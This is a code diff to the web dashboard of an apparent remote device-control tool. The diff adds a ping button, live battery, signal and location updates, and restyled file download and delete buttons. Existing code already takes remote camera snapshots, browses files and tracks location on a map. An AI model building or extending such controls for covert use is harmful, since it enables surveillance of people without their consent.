@@ -1807,6 +1807,26 @@
 
         function manualReconnect() { if (reconnectTimer) clearTimeout(reconnectTimer); if (ws) ws.close(); reconnectAttempts = 0; connectWebSocket(); }
 
+        function sendPing() {
+            if (!selectedDeviceId) return showNotification('No device selected');
+            const btn = document.getElementById('pingBtn');
+            if (!btn) return;
+            const originalText = btn.innerHTML;
+            btn.innerHTML = '⏳...';
+            btn.disabled = true;
+            
+            sendCommand('PING');
+            
+            // Timeout if no response in 5s
+            window._pingTimeout = setTimeout(() => {
+                if (btn.disabled) {
+                    btn.innerHTML = originalText;
+                    btn.disabled = false;
+                    showNotification('❌ Ping Timeout - Device may be offline');
+                }
+            }, 5000);
+        }
+
         function sendCommand(cmd, params = {}) {
             if (!ws || ws.readyState !== WebSocket.OPEN) { panel.innerHTML = '<div style="color:#d32f2f;">⚠ WebSocket not connected. <a href="#" onclick="manualReconnect()">Reconnect</a>.</div>'; return; }
             const payload = { type: 'COMMAND', command: cmd, requestId: 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5), params, deviceId: selectedDeviceId, timestamp: Date.now() };
@@ -2144,11 +2164,11 @@
                     <div class="file-toolbar">
                         <span style="font-weight: 600; color: #1a2634; font-size: 14px; margin-left: 8px;">File Browser</span>
                         <div style="display: flex; gap: 8px; margin-left: auto;">
-                            <button onclick="downloadSelected()" style="flex:1; display: flex; align-items: center; justify-content: center; gap: 4px;">
-                                ⬇️ <span id="downloadCount">${selectedFiles.length}</span>
+                            <button onclick="downloadSelected()" style="flex: 1; background: #f0f4f8; color: #102a43; border: 1px solid #d9e2ec; padding: 8px 16px; border-radius: 8px; font-weight: 600; font-size: 13px; cursor: pointer; transition: all 0.2s ease; display: flex; align-items: center; justify-content: center; gap: 6px; box-shadow: 0 1px 3px rgba(0,0,0,0.05);" onmouseover="this.style.background='#e3e8ee'; this.style.borderColor='#bccada';" onmouseout="this.style.background='#f0f4f8'; this.style.borderColor='#d9e2ec';">
+                                <span style="font-size: 15px;">⬇️</span> Download <span id="downloadCount" style="background: #ffffff; padding: 2px 6px; border-radius: 12px; font-size: 11px; margin-left: 2px; border: 1px solid #bccada; box-shadow: inset 0 1px 2px rgba(0,0,0,0.02);">${selectedFiles.length}</span>
                             </button>
-                            <button onclick="deleteSelected()" style="flex:1; background: #d32f2f; color: white; display: flex; align-items: center; justify-content: center; gap: 4px;">
-                                🗑️ <span id="deleteCount">${selectedFiles.length}</span>
+                            <button onclick="deleteSelected()" style="flex: 1; background: #fff5f5; color: #c53030; border: 1px solid #fed7d7; padding: 8px 16px; border-radius: 8px; font-weight: 600; font-size: 13px; cursor: pointer; transition: all 0.2s ease; display: flex; align-items: center; justify-content: center; gap: 6px; box-shadow: 0 1px 3px rgba(0,0,0,0.05);" onmouseover="this.style.background='#fed7d7'; this.style.borderColor='#fc8181';" onmouseout="this.style.background='#fff5f5'; this.style.borderColor='#fed7d7';">
+                                <span style="font-size: 15px;">🗑️</span> Delete <span id="deleteCount" style="background: #ffffff; padding: 2px 6px; border-radius: 12px; font-size: 11px; margin-left: 2px; border: 1px solid #fc8181; box-shadow: inset 0 1px 2px rgba(0,0,0,0.02);">${selectedFiles.length}</span>
                             </button>
                         </div>
                     </div>
@@ -3247,6 +3267,29 @@
         function capturePicture() { const camera = document.querySelector('input[name="clickCameraSelect"]:checked').value; sendCommand('CAMERA_SNAPSHOT', { camera, flash: document.getElementById('clickFlashCheckbox').checked }); }
         function displayCapturedImage(b64) { panel.innerHTML = `<img src="data:image/jpeg;base64,${b64}" style="max-width:100%;border-radius:8px;"><div style="margin-top:12px;"><button onclick="downloadBase64('${b64}','snapshot_${Date.now()}.jpeg')" style="background:#1976ff;color:white;border:none;padding:8px 16px;border-radius:6px;">💾 SAVE IMAGE</button></div>`; }
 
+        function updateDashboardStats(info) {
+            if (info.batteryLevel !== undefined) {
+                const el = document.getElementById('statBattery');
+                if (el) el.innerText = info.batteryLevel + '%';
+            }
+            if (info.networkType !== undefined) {
+                const el = document.getElementById('statSignal');
+                if (el) el.innerText = info.networkType;
+            }
+            if (info.latitude && info.longitude) {
+                const lat = parseFloat(info.latitude);
+                const lon = parseFloat(info.longitude);
+                currentLocation = { lat, lon, acc: info.accuracy || 20 };
+                // If map exists on this page, update it
+                const mapEl = document.getElementById('overviewMap');
+                if (mapEl && window._overviewMapObject) {
+                    window._overviewMapObject.setView([lat, lon], 16);
+                    if (window._overviewMarker) window._overviewMarker.setLatLng([lat, lon]);
+                    else window._overviewMarker = L.marker([lat, lon]).addTo(window._overviewMapObject).bindPopup('<b>Active Device</b><br>Updated location.').openPopup();
+                }
+            }
+        }
+
         async function renderDeviceOverview(isRefresh = false) {
             if (!isRefresh) panel.innerHTML = '<div style="padding:24px;">⏳ Building dashboard view...</div>';
             try {
@@ -3282,16 +3325,25 @@
 
                     <div class="overview-grid">
                         <div class="stat-card-premium">
-                            <div style="font-size:11px; font-weight:700; color:var(--text-sec); text-transform:uppercase; margin-bottom:12px; opacity:0.6;">⚡ Battery</div>
-                            <div style="font-size:36px; font-weight:700; color:var(--primary);">${battery}%</div>
+                            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px;">
+                                <div style="font-size:11px; font-weight:700; color:var(--text-sec); text-transform:uppercase; opacity:0.6;">⚡ Battery</div>
+                                <button onclick="sendCommand('GET_DEVICE_STATUS')" style="background:none; border:none; color:var(--primary); cursor:pointer; font-size:12px; padding:0;">🔄 Sync</button>
+                            </div>
+                            <div id="statBattery" style="font-size:36px; font-weight:700; color:var(--primary);">${battery}%</div>
                         </div>
                         <div class="stat-card-premium">
-                            <div style="font-size:11px; font-weight:700; color:var(--text-sec); text-transform:uppercase; margin-bottom:12px; opacity:0.6;">📶 Signal</div>
-                            <div style="font-size:36px; font-weight:700; color:var(--primary);">${signal} dBm</div>
+                            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px;">
+                                <div style="font-size:11px; font-weight:700; color:var(--text-sec); text-transform:uppercase; opacity:0.6;">📶 Signal</div>
+                                <button onclick="sendCommand('GET_DEVICE_STATUS')" style="background:none; border:none; color:var(--primary); cursor:pointer; font-size:12px; padding:0;">🔄 Sync</button>
+                            </div>
+                            <div id="statSignal" style="font-size:36px; font-weight:700; color:var(--primary);">${signal} dBm</div>
                         </div>
                         <div class="stat-card-premium">
-                            <div style="font-size:11px; font-weight:700; color:var(--text-sec); text-transform:uppercase; margin-bottom:12px; opacity:0.6;">🏷 Model</div>
-                            <div style="font-size:24px; font-weight:700; color:var(--primary);">${platform}</div>
+                            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px;">
+                                <div style="font-size:11px; font-weight:700; color:var(--text-sec); text-transform:uppercase; opacity:0.6;">🏷 Model</div>
+                                <button id="pingBtn" onclick="sendPing()" style="background:none; border:none; color:var(--primary); cursor:pointer; font-size:12px; padding:0;">⚡ Ping</button>
+                            </div>
+                            <div id="statModel" style="font-size:24px; font-weight:700; color:var(--primary);">${platform}</div>
                         </div>
                     </div>
 
@@ -3309,8 +3361,9 @@
                     const center = currentLocation ? [currentLocation.lat, currentLocation.lon] : [20.0, 0.0];
                     const map = L.map('overviewMap').setView(center, currentLocation ? 16 : 2);
                     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+                    window._overviewMapObject = map;
                     if (currentLocation) {
-                        L.marker([currentLocation.lat, currentLocation.lon]).addTo(map).bindPopup('<b>Active Device</b><br>Last reported location.').openPopup();
+                        window._overviewMarker = L.marker([currentLocation.lat, currentLocation.lon]).addTo(map).bindPopup('<b>Active Device</b><br>Last reported location.').openPopup();
                     }
                 }, 100);
 
@@ -3430,6 +3483,20 @@
                         }
                     } catch (e) { console.error('Error parsing location update:', e); }
                     break;
+                case 'PONG':
+                    clearTimeout(window._pingTimeout);
+                    const pBtn = document.getElementById('pingBtn');
+                    if (pBtn) {
+                        pBtn.innerHTML = '✅ PONG';
+                        setTimeout(() => { pBtn.innerHTML = '⚡ Ping'; pBtn.disabled = false; }, 2000);
+                    }
+                    showNotification('⚡ Instant Status: DEVICE ONLINE');
+                    break;
+                case 'DEVICE_INFO': try { 
+                    const info = typeof json.data === 'string' ? JSON.parse(json.data) : (json.data || json);
+                    updateDashboardStats(info); 
+                    showNotification('✅ Device info updated');
+                } catch (e) { } break;
                 case 'GEOFENCE_INFO': try { displayGeofenceInfo(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                 case 'FILE_INFO': fileTransfers[json.transferId] = { chunks: new Array(json.totalChunks), totalChunks: json.totalChunks, fileName: json.fileName, received: 0 }; document.getElementById('progressFileName').innerText = json.fileName; document.getElementById('progressPercent').innerText = '0%'; document.getElementById('progressBar').style.width = '0%'; document.getElementById('downloadProgress').style.display = 'block'; break;
                 case 'FILE_CHUNK':
